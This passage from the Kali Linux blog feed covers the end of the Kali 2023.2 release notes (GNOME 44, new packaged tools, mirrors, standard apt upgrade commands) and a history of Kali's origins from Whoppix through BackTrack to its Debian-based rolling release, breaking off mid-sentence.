Panel <ul> <li>Quickly connect or disconnect to bluetooth devices</li> </ul> </li> <li>Updated Settings App</li> <li>GNOMEs file chooser dialog can now display thumbnails</li> <li>Updated Kali theming</li> </ul> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-2-release/images/gnome-44-1.png'> <img src="https://www.kali.org/blog/kali-linux-2023-2-release/images/gnome-44-1.png" alt="GNOME 44" /> </a> </p> </p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-2-release/images/gnome-44-2.png'> <img src="https://www.kali.org/blog/kali-linux-2023-2-release/images/gnome-44-2.png" alt="GNOME 44 overview" /> </a> </p> </p> <h4 id="tiling-assistant-extension">Tiling Assistant Extension</h4> <p>With this release, we are excited to introduce a new extension for Kali&rsquo;s GNOME Shell desktop: Tiling Assistant. This extension elevates the default tiling experience, placing it on par with the quarter tiling support found in KDE and Xfce. With Tiling Assistant, you can surpass the limitations of the 2 column layout and unlock a range of powerful features. Enjoy intuitive window snapping, multi-monitor support, customizable keyboard shortcuts, and personalized settings, all designed to enhance your productivity and workflow.</p> <video class="video-shortcode" preload="metadata" autoplay muted loop> <source src="https://www.kali.org/blog/kali-linux-2023-2-release/videos/gnome-44-tiling.webm" > Your browser does not support the video tag. </video> <h2 id="app-icons-and-kali-menu-updates">App Icons and Kali Menu Updates</h2> <p>Beginning with this release, we are excited to announce that we have initiated work on updates and improvements for the Kali menu. Our primary focus is on enhancing the tools listed in the top 100 on the <a href="https://www.kali.org/tools/">kali.org/tools page</a>. This entails improving existing icons, introducing new ones, and enhancing the organization of Kali&rsquo;s menu categories.</p> <p>To provide you with a sneak peek, we have included a screenshot showcasing the new and updated app icons. We value your feedback, so if you believe that any particular tool would benefit from a new icon, please don&rsquo;t hesitate to open a bug report at <a href="https://bugs.kali.org/">bugs.kali.org</a>. Your input will contribute to the continued refinement of Kali&rsquo;s menu experience.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-2-release/images/gnome-44-new-icons.png'> <img src="https://www.kali.org/blog/kali-linux-2023-2-release/images/gnome-44-new-icons.png" alt="" /> </a> </p> </p> <h2 id="new-tools-in-kali">New Tools in Kali</h2> <p>It would not be a Kali release if there were not any new tools added! A quick run down of what has been added <em>(to the network repositories)</em>:</p> <ul> <li><a href="https://www.kali.org/tools/cilium-cli/">Cilium-cli</a> - Install, manage &amp; troubleshoot Kubernetes clusters</li> <li><a href="https://www.kali.org/tools/cosign/">Cosign</a> - Container Signing</li> <li><a href="https://www.kali.org/tools/eksctl/">Eksctl</a> - Official CLI for Amazon EKS</li> <li><a href="https://www.kali.org/tools/evilginx2/">Evilginx</a> - Standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication</li> <li><a href="https://www.kali.org/tools/gophish/">GoPhish</a> - Open-Source Phishing Toolkit</li> <li><a href="https://www.kali.org/tools/humble/">Humble</a> - A fast security-oriented HTTP headers analyzer</li> <li><a href="https://www.kali.org/tools/slimtoolkit/">Slim(toolkit)</a> - Don&rsquo;t change anything in your container image and minify it</li> <li><a href="https://www.kali.org/tools/syft/">Syft</a> - Generating a Software Bill of Materials from container images and filesystems</li> <li><a href="https://www.kali.org/tools/terraform/">Terraform</a> - Safely and predictably create, change, and improve infrastructure</li> <li><a href="https://www.kali.org/tools/tetragon/">Tetragon</a> - eBPF-based Security Observability and Runtime Enforcement</li> <li><a href="https://pkg.kali.org/pkg/thehive/">TheHive</a> - A Scalable, Open Source and Free Security Incident Response Platform</li> <li><a href="https://www.kali.org/tools/trivy/">Trivy</a> - Find vulnerabilities, misconfigurations, secrets, SBOM in containers, Kubernetes, code repositories, clouds and more</li> <li><a href="https://www.kali.org/tools/wsgidav/">Wsgidav</a> - Generic and extendable WebDAV server based on WSGI</li> </ul> <p><em>There has also been numerous packages updates and new libraries as well.</em></p> <h2 id="miscellaneous">Miscellaneous</h2> <p>Below are a few other things which have been updated in Kali, that do not have as much detail:</p> <ul> <li><a href="https://www.kali.org/blog/kali-linux-2023-1-release/#python-updates--changes">Python PIP changes</a> - Friendly reminder about <code>pip</code>&rsquo;s behavior changing in Kali 2023.4!</li> <li>When using <code>kali-tweaks</code>, altering OpenSSL security will now have an effect for Python based libraries as well!</li> <li>Our <a href="https://gitlab.com/kalilinux/build-scripts/kali-wsl-rootfs">Kali WSL rootfs build-script</a> got a overhaul. The result will now give a similar experience both using it as well as the output as it will include more of the standard packages by default. </li> </ul> <h2 id="kali-arm-updates">Kali ARM Updates</h2> <p>When using the <a href="https://www.kali.org/docs/development/arm-build-scripts/">ARM build-scripts</a>, it will now prompt you to reboot after installing build dependencies if required.</p> <p>Plus, we are now including additional firmware on all ARM images.</p> <p>The <a href="https://www.kali.org/docs/arm/usb-armory-mkii/">USBArmory MKII</a> image currently only supports the 512MB variant. The version of u-boot has been bumped.</p> <p>The <a href="https://www.kali.org/docs/arm/raspberry-pi-zero-w-p4wnp1-aloa/">Raspberry Pi P4wnP1 image</a> is now considered community supported. Unfortunately the upstream project does not support newer versions of <code>bluez</code> that Kali has, so until that is fixed, we do not want to ship an image that does not work properly.</p> <h2 id="kali-documentation-updates">Kali Documentation Updates</h2> <p>Our <a href="https://www.kali.org/docs/">Kali documentation</a> has had various updates to existing pages as well as the following new pages:</p> <ul> <li><a href="https://www.kali.org/docs/troubleshooting/handling-common-apt-errors/">Handling common APT problems</a></li> <li><a href="https://www.kali.org/docs/virtualization/import-premade-hyperv/">Import Pre-Made Kali Hyper-V VM</a></li> <li><a href="https://www.kali.org/docs/wsl/wsl-preparations/">Kali WSL</a></li> <li><a href="https://www.kali.org/docs/troubleshooting/no-sound/">No sound on Kali 2023.2</a></li> <li><a href="https://www.kali.org/docs/virtualization/troubleshooting-vmware/">Troubleshooting Kali VMware VM</a></li> </ul> <p>We also want to say a little thank you to following for their work:</p> <ul> <li><a href="https://gitlab.com/107cwk">107 cwk</a></li> <li><a href="https://gitlab.com/8bitBoy">8bitBoy VT100</a></li> <li><a href="https://gitlab.com/dwehrmann">Dennis Wehrmann</a></li> <li><a href="https://gitlab.com/kamalmjt">Kamal</a></li> <li><a href="https://gitlab.com/snowcra5h">snowcra5h</a></li> <li><a href="https://gitlab.com/X0RW3LL">X0RW3LL</a></li> </ul> <h2 id="kali-blog-recap">Kali Blog Recap</h2> <p>Since our last release, we did the following <a href="https://www.kali.org/blog/">blog posts</a>:</p> <ul> <li><a href="https://www.kali.org/blog/10-years/">Happy 10th anniversary &amp; Kali&rsquo;s story &hellip;so far</a></li> </ul> <h2 id="community-shout-outs">Community Shout-Outs</h2> <p>These are <strong>people from the public who have helped Kali</strong> and the team for the last release. And we want to praise them for their work <em>(we like to give credit where due!)</em>:</p> <ul> <li><a href="https://twitter.com/frangalinux">Francisco Jose Rodriguez Martos</a> - improving the arm build scripts yet again. Thank you so very much!</li> <li>Salty (from the <a href="https://discord.kali.org/">Kali Discord</a>) - doing the release testing for the Raspberry Pi 4.</li> <li>Mihir Parekh - reporting an issue with Kali KDE desktop in VMware, along with the workaround.</li> </ul> <p>Anyone can help out, anyone can get <a href="https://www.kali.org/docs/community/contribute/">involved</a>!</p> <h3 id="new-kali-mirrors">New Kali Mirrors</h3> <p>We have some new mirrors since the year started! Those are:</p> <ul> <li>UK: <a href="https://mirror.vinehost.net/kali">mirror.vinehost.net</a>, sponsored by <a href="https://www.vinehost.net">VineHost</a>, thanks to Callum White.</li> <li>Moldova: <a href="https://md.mirrors.hacktegic.com/kali">md.mirrors.hacktegic.com</a>, sponsored by <a href="https://hacktegic.com/">Hacktegic Technologies SRL</a>, thanks to Artiom Mocrenco.</li> <li>Indonesia: <a href="https://xsrv.moratelindo.io/kali">xsrv.moratelindo.io</a>, sponsored by <a href="https://www.moratelindo.co.id/eng/index.html">PT Mora Telematika Indonesia</a>, thanks to Deddy Harison.</li> <li>Ukraine: <a href="https://fastmirror.pp.ua/kali">fastmirror.pp.ua</a>, thanks to Ivan Barabash.</li> </ul> <p>We almost got a new mirror in South America, but it did not work out, and we realized that we really lack mirrors in this region of the world. If you&rsquo;re an organization in South America with quite some bandwidth to spare, and you want to improve Kali Linux availability in South America, check our guide on <a href="https://www.kali.org/docs/community/setting-up-a-kali-linux-mirror/">how to setup a Kali Linux Mirror</a>. If you think it&rsquo;s for you, please <a href="https://www.kali.org/docs/community/setting-up-a-kali-linux-mirror/#making-it-public---getting-in-contact">reach out</a>!</p> <hr> <h2 id="kali-team-discord-chat-session">Kali Team Discord Chat Session</h2> <p>The next <a href="https://discord.kali.org/">Kali Discord</a> session will happen a week after the release, <strong>Wednesday, 7th June 2023 16:00 -&gt; 17:00 <a href="https://time.is/UTC">UTC/+0 GMT</a></strong>.</p> <p><em>Please note, we will not be recording these sessions. These are live sessions only.</em></p> <h2 id="get-kali-linux-20232">Get Kali Linux 2023.2</h2> <p><strong>Fresh Images</strong>: So what are you waiting for? Go <a href="https://www.kali.org/get-kali/">get Kali</a> already!</p> <p>Seasoned Kali Linux users are already aware of this, but for the ones who are not, we do also produce <strong><a href="https://cdimage.kali.org/kali-images/kali-weekly/">weekly builds</a></strong> that you can use as well. If you cannot wait for our next release and you want the latest packages <em>(or bug fixes)</em> when you download the image, you can just use the weekly image instead. This way you will have fewer updates to do. <em>Just know that these are automated builds that we do not QA like we do our standard <a href="https://www.kali.org/releases/">release images</a></em>. But we gladly take <a href="https://bugs.kali.org/">bug reports</a> about those images because we want any issues to be fixed before our next release!</p> <p><strong>Existing Installs</strong>: If you already have an existing Kali Linux installation, remember you can always do a quick <a href="https://www.kali.org/docs/general-use/updating-kali/">update</a>:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ echo &quot;deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware&quot; | sudo tee /etc/apt/sources.list [...] +--(kali?kali)-[~] +-$ sudo apt update &amp;&amp; sudo apt -y full-upgrade [...] +--(kali?kali)-[~] +-$ cp -vrbi /etc/skel/. ~/ [...] +--(kali?kali)-[~] +-$ [ -f /var/run/reboot-required ] &amp;&amp; sudo reboot -f </code></pre> <p>You should now be on Kali Linux 2023.2 We can do a quick check by doing:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ grep VERSION /etc/os-release VERSION=&quot;2023.2&quot; VERSION_ID=&quot;2023.2&quot; VERSION_CODENAME=&quot;kali-rolling&quot; +--(kali?kali)-[~] +-$ uname -v #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1kali1 (2023-05-12) +--(kali?kali)-[~] +-$ uname -r 6.1.0-kali9-amd64 </code></pre> <p><em>NOTE: The output of <code>uname -r</code> may be different depending on the system <a href="https://pkg.kali.org/pkg/linux">architecture</a>.</em></p> <p>As always, should you come across any bugs in Kali, please submit a report on our <a href="https://bugs.kali.org/">bug tracker</a>. <em>We will never be able to fix what we do not know is broken!</em> <strong>And social networks are not Bug Trackers!</strong></p> <p><em>Want to keep in up-to-date easier? We have a <a href="https://www.kali.org/rss.xml">RSS feeds</a> and <a href="https://www.kali.org/newsletter/">newsletter</a> of our <a href="https://www.kali.org/blog/">blog</a>!</em></p></description>
</item>
<item>
<title>Happy 10th anniversary & Kali's story ...so far</title>
<link>https://www.kali.org/blog/10-years/</link>
<guid isPermaLink="true">https://www.kali.org/blog/10-years/</guid>
<pubDate>Wed, 29 Mar 2023 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/10-years/images/banner-kali-10-year.jpg" type="image/jpg"/>
<description> <p>Wednesday 13th, March 2013, 10 years ago, Kali Linux v1.0 was <a href="https://www.kali.org/docs/introduction/press-release/">first released</a>. Today we want to celebrate Kali&rsquo;s 10th anniversary!</p> <p>Time has flown. And gosh, a lot has changed since then! <em>They grow up so fast!</em></p> <p>This is the story of how Kali came to be, and some of the challenges along the way. </p> <h2 id="yesterday-is-history-the-past">Yesterday is History: The Past</h2> <p>How did we get to where we are today? There is a quick answer, and a not so quick answer.</p> <p><strong><a href="https://www.kali.org/releases/">Quick</a> history lesson</strong></p> <p>It all began in 2004, with <strong>Whoppix</strong>, a security operating system based on Knoppix. This lead into <strong>WHAX</strong> in 2005, which used Slax. In 2006, <strong>BackTrack Linux</strong> happened which was based initially on Slax, then moved to Ubuntu. Every one of these OSes and its changes were done to solve different problems. Using everything which was learnt, <strong>Kali Linux</strong> was born. A fresh start in March 2013.</p> <p><strong><a href="https://www.kali.org/docs/introduction/kali-linux-history/">Longer</a> history lesson</strong></p> <p><em>Knoppix - Initial two weeks work</em></p> <p>Whoppix <em>(White-Hat and knOPPIX)</em> came about as the founder, @Muts, was doing an in-person air-gap network penetration test lasting for two weeks in 2004. It was a government contract, and he was not allowed to bring in his own laptop nor allowed to install any software on their machines. So every day, he was only allowed to take in software on a CD-ROM, before it was destroyed at the end of each day. At the time, Live CDs were the &ldquo;in thing&rdquo;. They would allow you to run a Linux OS completely off a disk, using RAM as a temporary HDD, without leaving a trace behind. Knoppix was chosen as the base OS which is Debian-based. He created one for this assessment and pre-loaded it with various tools that he believed he would need for the job. Each night, he would go back, tweak it by adding more tools or bug fixes. After the assessment was over, he cleaned it up and shared it online on a forum in August 2004. He then left for a vacation. Upon getting back he checked the logs to see the download numbers, and could not believe that it was so popular! He started to get requests from people, asking for tools to included as well as bug reports.</p> <p><p> <a href='https://www.kali.org/blog/10-years/images/Whoppix2-1.png'> <img src="https://www.kali.org/blog/10-years/images/Whoppix2-1.png" alt="whoppix 2.x" /> </a> </p> </p> <hr> <p><em>Slax - Starting to take it seriously</em></p> <p>What had started off as a &ldquo;quick small thing&rdquo; for single assessment, had started to gain traction. With Whoppix growing in popularity, it was becoming harder to develop for. At the time, Slax had a more mature toolchain for generating Live-CDs and working with OverlayFS. Thus it was a better suited option. <em>Editors note: We cannot say for certain, but the image file size may have become an issue. With more tools wanting to be added, space was running out. This was at a time when CD-R were at their peak, giving you 650-700 MB and USB media was not yet on the scene. By switching to Slax, the base OS size dropped, and allowed for more custom packages to be included as well as tighter compression (LZMA). Overall, this gave a lot more space to grow.</em></p> <p><p> <a href='https://www.kali.org/blog/10-years/images/Whax3-5.png'> <img src="https://www.kali.org/blog/10-years/images/Whax3-5.png" alt="Whax 3.0" /> </a> </p> </p> <hr> <p><em>Merging into BackTrack</em></p> <p>At the same time, there was a similar project happening over at remote-exploit, <strong>Auditor Security Collection</strong> (based on Knoppix), which first started in 2005. Auditor and WHAX had similar goals, but different strengths. At the time, cooperation on &ldquo;Open-Source projects&rdquo; was very different to what it is today, as it was &ldquo;I made this thing, I&rsquo;m sharing it.&rdquo; It was more a few large players contributed, rather being able to accept work from lots of smaller submissions. After a bit of discussion between the authors, it made sense rather than both projects tackling the same problems, for the projects to merge together. This created BackTrack in May 2006. Initially, it was still based on Slax, but moved to Ubuntu later on. <em>Editors note: We cannot say for certain, where the name &ldquo;BackTrack&rdquo; originated from. At the time, when internally debugging problems, the phrase &ldquo;Back tracking through the logs&rdquo; got said frequency. We cannot say which came first, the phrase or the name.</em></p> <p><p> <a href='https://www.kali.org/blog/10-years/images/BackTrack1-3.png'> <img src="https://www.kali.org/blog/10-years/images/BackTrack1-3.png" alt="BackTrack 1" /> </a> </p> </p> <hr> <p><em>OffSec&rsquo;s Start</em></p> <p>Walking around Black Hat USA 06, the team noticed how many people were using their project, and offering training using it. After listening to a few sales pitches, and training offerings, the team noticed just how many people were getting it wrong. As a result, <a href="https://www.offsec.com/">OffSec (previously known as Offensive Security)</a>, was created. Training from the people who made the tools. Who else would know it better?!</p> <hr> <p><em>USB - Live-Boot &amp; Persistent</em></p> <p>BackTrack now had a stable, mature Live-CD project and it was exactly what was needed for the problem which was air-gap networks at the time. Whilst these Live-CDs were the answer for some scenarios, the team wanted to expand into more areas. The cost of USB flash drives/sticks had came down dramatically, as a result were more freely available. There was then a shift to &ldquo;Live-Boot&rdquo; (either CDs or USBs). The next item to solve would be getting their data to be &ldquo;persistent&rdquo; rather than losing it when powered off. Enter BackTrack 3 in June 2008.</p> <figure > <audio controls preload="metadata"> <source src="https://www.kali.org/blog/10-years/audio/finishim.wav" type="audio/mpeg"> </audio> </figure> <p><em>Login sound</em></p> <hr> <p><em>System Updates</em></p> <p>A few months later, the team was once again at Black Hat USA &amp; DEF CON, and were really excited by how many people were using their creation, and got to see first hand how people were using it. <em>DEF CON was also aware, as they were tracking user&rsquo;s user-agents in web requests!</em> Times were different to how it is now. It was common for <em>big</em> exploits to make an appearance around these security conferences. 2008 was no exception. Walking about, the team could see first hand how many people were vulnerable, and they were helpless as they had no way of pushing out a patch. A drawback with Live-Boot is that in order to update to the latest release, you need to replace the whole OS. A complete re-install. Even with persistence for USBs, it is more for user data, rather than packages. Even if you installed BackTrack, there was not an update mechanism as the infrastructure was not in place to support it. You could not get the latest version. You would have to do a complete re-install. The team knew what their next problem was to solve: system updates.</p> <p>As the project needs changed, the team had started hitting technical limitations of using Slax as the base, and started to look for an alternative underlying OS. They needed a way for end-users to easily update their system, without doing a complete re-install. Ubuntu was making a lot of positive noise, was gaining a lot of traction as it was popular with end-users, and had good development tools. It allowed for package updates to easily be applied to people systems. In February 2009, at Shmoocon, BackTrack 4 &ldquo;Beta&rdquo; was released using Ubuntu.</p> <p>This change signals the start of BackTrack becoming a &ldquo;real OS&rdquo; - a traditional fully feature distribution. Previously when there was a major change, there would be a new name for the project. However, because BackTrack was getting to be known, it had grown legs, started appearing in the media, it was becoming ingrained in pop culture, they wanted to keep the momentum going.</p> <hr> <p><em>Installer</em></p> <p>In various releases prior, there was an installer included, which got carried over from the underlying base OS (Slax). However, it was not straight forward to use, and it was expected that certain commands were ran prior to execution. This, plus not allowing for any customization meant it was dropped in later releases.</p> <p><p> <a href='https://www.kali.org/blog/10-years/images/BackTrack3-3.png'> <img src="https://www.kali.org/blog/10-years/images/BackTrack3-3.png" alt="BackTrack 3" /> </a> </p> </p> <p>With computer hardware getting more powerful each year, using virtual machine became more accessible. Users then started to want to be able to install BackTrack. The community started to contribute guides on how to manually install BackTrack, as well as creating an official tutorial via the terminal. The goal was now clear, BackTrack needed an &ldquo;easy&rdquo; installer. A graphical one happened in BackTrack 4 &ldquo;Pre-Final&rdquo; in June 2009.</p> <hr> <p><em>Domain</em></p> <p>The team knew how much BackTrack was growing in popularity, and as they did not switch the project name when using Ubuntu, it was time to create its own place on the Internet. With the launch the first stable release of BackTrack 4 in January 2010, the project got its own domain (<a href="https://www.backtrack-linux.org/">backtrack-linux.org</a>) and moved off remote-exploit.</p> <p><p> <a href='https://www.kali.org/blog/10-years/images/BackTrack4-4.png'> <img src="https://www.kali.org/blog/10-years/images/BackTrack4-4.png" alt="BackTrack 4" /> </a> </p> </p> <hr> <p><em>System Upgrades</em></p> <p>When the team started work switching from Slax to Ubuntu, they grabbed the latest release at the time (8.10 - Intrepid Ibex). As this was not a &ldquo;Long-Term Support&rdquo; (LTS) release, upstream would only support it until April 2010 - one year &amp; six months. This means, towards the end of this version, updates became fewer, packaging became harder, and workload increased. Things were not as stable as when it was first released.</p> <p>It was not until May 2011 that the next major version of BackTrack got released, which also happens to be the last, BackTrack 5. This time, it was based on Ubuntu 10.04 (Lucid Lynx) LTS. This gave three years of support from upstream. </p> <p><p> <a href='https://www.kali.org/blog/10-years/images/BackTrack5-3.png'> <img src="https://www.kali.org/blog/10-years/images/BackTrack5-3.png" alt="BackTrack 5" /> </a> </p> </p> <p>Upgrading from BackTrack 4 to BackTrack 5 meant doing a complete re-install (two other Ubuntu in-between, <code>9.xx</code>!). Even though there was a packaging update system in-place, there was not an upgrade path. This was still the same behavior as when using Slax. <em>Same mentality as Live-boot: replace the OS for each release, not upgrade.</em> It did not make for a good end-user experience. All their data, any custom programs they installed, all the customizations to their machines, would be lost when switching to the latest version. <em>As a result, it meant that people were reluctant to upgrade, as it would be a lengthy process for them.</em> The team had their new challenge to try and overcome.</p> <hr> <p><em>Final Fresh Start</em></p> <p>For the next few years, the team was busy working away, doing what they do best. However, they started to run into various problems again. As these problems started to accumulate, it was clear that a re-build was required once again, <em>for the final time</em>. As so much had changed, the project would not get away with not swapping names. They needed to drive home just how much change there was. BackTrack Linux became Kali Linux in March 2013.</p> <p><em>You can read more of <a href="https://www.kali.org/blog/10-years/#backtrack-6">technical limitations here</a>, as well as <a href="https://www.kali.org/blog/10-years/#kalis-name">why the name, Kali</a>.</em></p> <p><p> <a href='https://www.kali.org/blog/10-years/images/Kali1.0-2.png'> <img src="https://www.kali.org/blog/10-years/images/Kali1.0-2.png" alt="Kali 1.0" /> </a> </p> </p> <p>Kali 1.0 (Moto) <a href="https://www.kali.org/docs/introduction/press-release/">first saw the light of day</a> at <a href="https://www.blackhat.com/eu-13/">Black Hat Europe 2013</a> and was based on Debian 7. With the new infrastructure in place, building and publishing images became more automated and simplified. As a result, there were multiple revisions made to address bug fixes and even a minor update. This gave a better experience for users, as they were not having to wait months for an updated image.</p> <p><p> <a href='https://www.kali.org/blog/10-years/images/Kali1.1-2.png'> <img src="https://www.kali.org/blog/10-years/images/Kali1.1-2.png" alt="Kali 1.1" /> </a> </p> </p> <p>The team then waited for Debian 8 to be released, before pushing out Kali 2.0 (Sana) in August 2015 (at <a href="https://www.blackhat.com/us-15/briefings.html#the-kali-linux-dojo-workshop-#1-rolling-your-own-generating-custom-kali-linux-20-isos">Black Hat USA 15</a> &amp; <a href="https://defcon.org/html/defcon-23/dc-23-kali-dojo.html">DEF CON 23</a>). This time, for the first time, people could upgrade their systems between major project updates! It did require a very minor alteration for the end-user to be able to do this <em>(updating apt&rsquo;s source to use the new codename)</em>.</p> <p><p> <a href='https://www.kali.org/blog/10-years/images/Kali2.0-3.png'> <img src="https://www.kali.org/blog/10-years/images/Kali2.0-3.png" alt="Kali 2.0" /> </a> </p> </p> <hr> <p><em>Moving to Rolling</em></p> <p>Overall, the feedback received for Kali 2.0 was positive, and it was a success. One of the reasons it was so well received was because of the updated versions of most packages. In information security (infosec) there is the need to be on the latest version. This is often because:</p> <ul> <li>Being a developer, you may need the latest feature which has just been added.</li> <li><em>Being a system administrator, a patch could contain a security update to stop a vulnerability.</em></li> </ul> <p>Writing exploits or developing infosec tools is no exception, they often need to have access to the latest libraries. Debian is stable, and that is because they only update their stable release about every two years, in order for packages to then be the latest tested version. <em>They will manually &ldquo;backport&rdquo; updates to patch any security vulnerabilities for older versions in order to fix that version of the package</em> </p> <p>As two years is a very long time in infosec to wait to get an update, users were following bad practices in order to attempt to get the latest version. At times, they would break their setup in the process. The team had their new challenge to try and overcome!</p> <p>To help understand why, it may take up to two years to get a package updated in stable. However, that does not mean its not ready before then as there is a whole workflow behind it. There is a branch called &ldquo;testing&rdquo;, which is for packages that are ready to into stable, but only when the time is ready for every package. A package will start in &ldquo;unstable&rdquo;, and once it passes Debian&rsquo;s strict package testing process will it make it into testing. There are numerous packages upgrades in testing that never make it into stable, which would be in a stable state to release. This felt like a good balance of being stable and up-to-date for Kali team.</p> <p>As soon as Kali 2.0 was out of the door, the Kali team knew what they had to do. Move from &ldquo;Debian stable&rdquo; to &ldquo;Debian testing&rdquo;. 5 months later, January 2016 Kali become a rolling distribution with Kali 2016.1.</p> <p><p> <a href='https://www.kali.org/blog/10-years/images/Kali2019.4-4.png'> <img src="https://www.kali.org/blog/10-years/images/Kali2019.4-4.png" alt="Kali 2019.4" /> </a> </p> </p> <p>From this point forwards, the Kali team would take a &ldquo;snapshot&rdquo; of the network repository, test and then release that. This is because updates are continuously happening from &ldquo;Debian testing&rdquo;.</p> <p>Snapshots are now taken about once a quarter, giving four major releases a year, rather than doing it a few months after Debian&rsquo;s stable release once every two years.</p> <p><p> <a href='https://www.kali.org/blog/10-years/images/Kali2020.4-2.png'> <img src="https://www.kali.org/blog/10-years/images/Kali2020.4-2.png" alt="Kali 2020.4" /> </a> </p> </p> <hr> <p><em>Believe it or not, there is even more to the story where can go into more detail. If this is something you would like, let us know!</em></p> <h3 id="dragon-logo">Dragon Logo</h3> <p>Throughout the projects, one item has been constant. The logo. The dragon. To the point that the logo is potentially better known than the project itself!</p> <p>What originally started out to be a competition, originating on the Whoppix forum, the idea was &ldquo;best graphic will be the next wallpaper&rdquo;. The first submission that was awarded the winner, was the dragon. We liked it so much, we never re-opened the competition for the next version!</p> <p>What we did not know at the time, was that the submission was plagiarized. It was taken from deviantart without the authors permission. We tracked down the rightful author and bought out the rights to it for Kali Linux.</p> <p>The design of the dragon has been slightly tweaked over the years, by altering here and there such as making it thinner in places <em>(put on a diet!)</em>, curving the tail a little more etc. But we have always been careful to protect the iconic image as it is one of the most recognizable logos in this space. And to answer the question, we have no plans to ever replace the dragon logo.</p> <p><p> <a href='https://www.kali.org/blog/10-years/images/dragons.png'> <img src="https://www.kali.org/blog/10-years/images/dragons.png" alt="Dragons" /> </a> </p> </p> <p><em>Left, Old. Right, New</em></p> <h3 id="backtrack-6">BackTrack 6?</h3> <p>Rather than releasing BackTrack 6, Kali 1.0 (Moto) came out instead. But why? With BackTrack 3 -&gt; 4 (Slax to Ubuntu), why not with BackTrack 5 -&gt; 6 (Ubuntu -&gt; Debian)? Why was there such a fresh start and not keep the momentum going?</p> <p>Well, a few new problems had started to arise, some technical, others not, and the team knew that one day they would need to find for solutions, such as:</p> <p><strong>Upstream origin</strong></p> <p>Ubuntu worked well for a number of years, however the team were increasingly finding that they were running into technical issues, causing limitations. At the time, if someone found an issue with a package on BackTrack, if it was not something custom to BackTrack, it would need to go &ldquo;upstream&rdquo; to Ubuntu. As Ubuntu uses Debian as its base, if they have not forked the package, it would need to then go to Debian to solve it. Then when a patch is created, it would need to be pushed into Debian, to be pulled into Ubuntu, to be pulled into BackTrack. This was a lengthy procedure. Otherwise, the team would have to fork a package, thus taking on ownership and responsibility of maintenance, to include a patch. With more packages requiring forks, more time was spent maintaining the OS rather than security focused aspects, which took the fun out of the team as it became more of a nightmare. The decision was made to cut out the middle layer, to use Debian as the base, rather than Ubuntu.</p> <p><strong>Upstream direction</strong></p> <p>By also using another OS as your base, you often follow their direction for their project. You can alter, but it does add additional complexity when synchronizing (think <code>git rebase</code>). This takes time and focus away from what makes BackTrack, BackTrack! Ubuntu had announced a major desktop environment change. Going from GNOME as their default to something they had created, Unity (and Mir). At the time, it had caused a bit of controversy. We also knew that certain tools would not be compatible. <em>Editors note: Whoppix &amp; Whax both used KDE as the default Desktop Environment, and we switched to GNOME when using Ubuntu.</em></p> <p>We also did not know just how difficult it ended up being to fully customise Ubuntu. At the time the Ubuntu developers had put various restrictions in place to stop things which we needed to-do. We believe this was because they were trying to make a OS that was user-friendly for people first starting out, rather than for people who were experience with Linux, who would be trying to-do a penetration test.</p> <p><strong>Stability</strong></p> <p>If we were going to be using Debian, it is best to follow their rules. Therefore we needed to follow &ldquo;the correct Debian standard for packaging&rdquo;. This meant we had to abide by Linux&rsquo;s Filesystem Hierarchy Standard (FHS). This was introduced right back in the start with Whoppix so people had gotten used to <code>/pentest</code> directory, and liked it. However, it was a reason why the project had stability issues, thus users may have issues upgrading. It was not the best way to manage or maintain packages. The upside is, programs got added to <code>$PATH</code>, allowing you to call a program from any location!</p> <p>The lack of FHS was hurting us in many different ways. Because of packages not being in the expected Linux location, we had to manually create links for libraries. This was of course a dependency nightmare. As you then expected, it was painful to update packages due to the amount of work, thus tools became outdated.</p> <p>This was also a reason why you should not have added BackTrack&rsquo;s network repository to another OS! Plus if you started to try an install things outside of BackTrack&rsquo;s network repository, it was only too easy to have a knock on effect breaking something else. It was not right to be so worry to perform an update, as simple updates may break installs.</p> <p><strong>Package maintenance</strong></p> <p>Because of Debian&rsquo;s standards, for end users, it helped to make packages more stable as well has having defined path for updates and upgrades. For us developers, maintaining a package also became easier. As a result, we can:</p> <ul> <li>Look at a package&rsquo;s metadata, so we know where the code upstream is (where it lives)</li> <li>Have alerts when there has been an updated release out upstream</li> <li>Use tools that are design to download and updated code</li> <li>Import the update code</li> <li>Update any necessary metadata, keeping it up-to-date and relevant</li> <li><em>And include the original archive (in another git branch)</em></li> </ul> <p>So all we have to do is build the package locally, test it to make sure it works. Then sign off on it, by adding our digital signatures to the packages (so it came from us and not tampered/altered by any malicious party), before uploading the package source to the build bots, which will re-compile it for every supported architecture. Simple!</p> <p>This mature workflow helps prevent all the odd weird edge cases that were causing users machines to break by doing simple updates. This helps make the system more robust.</p> <p><strong>Customization</strong></p> <p>The above talks about packages, but another item to call out is the images. We could then be used to bootstrap builds, allowing for custom images to be generated, such as giving the flexibility for switching between desktop environments creation (GNOME? KDE? Xfce? Something else? Go for it!). Plus, it would support pre-seed answer files during setup, allowing to do unattended fully automate installs. This is more of a correct way of doing things, rather than a hacky job <em>e.g. generate the files, rather than relying on post-install scripts to modify afterwards.</em></p> <p><strong>ARM - multi architecture</strong></p> <p>Since BackTrack 4, the option was there for ARM support. We then experimented and released ARM support with BackTrack 5. At this point, we knew this was something we wanted to explore more going forwards. At the time, there was a lot of manual work involved, creating chroots for each device (started with Motorola Xoom). With BackTrack, we were forced to build the image, on the device itself, which does not scale well at wanting to support more device. Debian would not only allow for us to do that, but streamlined the process. At this point, we were able to treat ARM as a first-class citizen going forwards. This has been accelerated with <a href="https://www.kali.org/blog/ampere/">Ampere</a>&rsquo;s infrastructure support.</p> <p><strong>Infrastructure</strong></p> <p>With BackTrack, we were using subversion for our control system. We were starting to get requests for governments, as they wanted to use our OS internally. However, there was were sticking points. We needed to digitally sign our packages, and they needed to be able to compile the OS themselves internally. As we were scrapping it all and starting from scratch when starting with Kali, we moved to Git and used GPG to tag releases, at the same time, published all our build-scripts allowing anyone to build Kali on any platform. This made Kali truly open-source.</p> <p>At the same time as the switch, we did some big internal changes. We originally set up our own public git server, but since then we have out grew it now migrated to <a href="https://about.gitlab.com/blog/2021/02/18/kali-linux-movingtogitlab/">GitLab</a> and taken it to the next level. The team was growing, and we needed to start to scale, rather than having a few 